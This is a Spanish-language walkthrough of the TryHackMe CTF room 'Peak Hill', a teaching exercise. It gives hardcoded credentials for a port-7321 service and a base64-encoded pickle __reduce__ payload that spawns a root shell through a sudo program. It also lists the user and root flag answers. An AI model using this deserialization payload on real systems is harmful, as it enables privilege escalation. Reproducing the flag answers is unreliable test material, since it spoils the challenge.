# Peak Hill

| **Dificultad** | MEDIUM | **Tipo** | CTF (Free) | **Slug** | `peakhill` |
| **Link** | [TryHackMe](https://tryhackme.com/room/peakhill) | **Sección** | Linux / CTF | **Fuente** | TryHackMe |
| **Componentes** | Reconocimiento de redes, servicio TCP 7321, Python, hardcoded credentials, Pickle deserialization, sudo | **Impacto** | Compromiso total del host Linux: acceso inicial a un servicio Python vulnerable con credenciales hardcodeadas y escalada a root mediante deserialización insegura de pickle vía sudo |

---

**Contexto:** Esta sala es un CTF Linux de dificultad media. El reconocimiento descubre un servicio en el puerto 7321 con credenciales hardcodeadas (recuperables con Python), que permite ejecutar comandos como el usuario `dill`. Tras obtener la user flag en `/home/dill/user.txt`, se aprovechan los permisos `sudo` sobre `peak_hill_farm`, un programa que deserializa input pickle y permite ejecutar código arbitrario como root mediante un payload `__reduce__` codificado en base64, para leer la root flag en `/root/root.txt`.

> **ES:** CTF Linux de dificultad media: enumeración de un servicio TCP en el puerto 7321, credenciales hardcodeadas descifradas con Python, ejecución de comandos como el usuario dill, y escalada a root explotando la deserialización de pickle de `peak_hill_farm` con sudo.
> **EN:** Medium Linux CTF: enumeration of a TCP service on port 7321, hardcoded credentials decoded with Python, command execution as user dill, and privilege escalation to root by exploiting pickle deserialization in `peak_hill_farm` via sudo.

## Solucionario

### Task 1: Captura de Flags / Flags Capture

**Explicación:** El servicio del puerto 7321 autentica con las credenciales hardcodeadas `dill` / `n3v3r_@_d1ll_m0m3nt` y permite ejecutar comandos como el usuario `dill`. La user flag se lee de `/home/dill/user.txt`. Para la escalada se ejecuta `sudo ./peak_hill_farm` y, al ser el programa vulnerable a la deserialización insegura de pickle, se envía un payload base64 que sobrescribe `__reduce__` para lanzar `/bin/bash`; la root flag se extrae de `/root/root.txt` (cuyo nombre contiene caracteres ocultos, por lo que se localiza por inode con `find`).

```
$ nc 10.10.X.X 7321
Username: dill
Password: n3v3r_@_d1ll_m0m3nt
Successfully logged in!
Cmd: cat /home/dill/user.txt
f1e13335c47306e193212c98fc07b6a0
```

```
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!
What are we planting today? gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4=
root@ubuntu-xenial:/opt/peak_hill_farm# find /root/ -name "*root.txt*" -exec cat {} \;
e88f0a01135c05cf0912cf4bc335ee28
```

1. 1. f1e13335c47306e193212c98fc07b6a0
   2. e88f0a01135c05cf0912cf4bc335ee28

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | What is the user flag? | `f1e13335c47306e193212c98fc07b6a0` |
| 1.2 | What is the root flag? | `e88f0a01135c05cf0912cf4bc335ee28` |

---

**Metodología:** Enumeración del puerto 7321 (servicio de chat/ejecución de comandos) y extracción de las credenciales hardcodeadas con Python para autenticarse. Tras obtener una shell como `dill` se lee la user flag. Se usa el RSA key de `dill` (o el propio servicio) para continuar, se detecta que `peak_hill_farm` puede ejecutarse con `sudo` y se explota su deserialización de pickle: se construye un payload serializado que sobreescribe `__reduce__` invocando `system('/bin/bash')`, se codifica en base64 y se introduce en el programa, obteniendo una shell root. Finalmente se lee la root flag localizando el archivo con `find` por su nombre (con caracteres invisibles) o por inode.

**Learning chain:** nmap/enumeración → descubrimiento del puerto 7321 → credenciales hardcodeadas descifradas con Python → login y RCE como dill → user flag (/home/dill/user.txt) → RSA key de dill → sudo peak_hill_farm → deserialización insegura de pickle (__reduce__ + base64) → shell root → root flag (/root/root.txt).

**Lección:** *La deserialización insegura de módulos como pickle es un vector de ejecución de código arbitrario: si un programa con privilegios procesa input serializado sin verificar, un payload `__reduce__` bien formado entrega una shell root. Además, las contraseñas hardcodeadas en el frontend (o en recursos descargables) son un fallo crítico de diseño.*

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation), T1059.006 (Command and Scripting Interpreter: Python)

**Fuente:** [TryHackMe - Peak Hill](https://tryhackme.com/room/peakhill)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.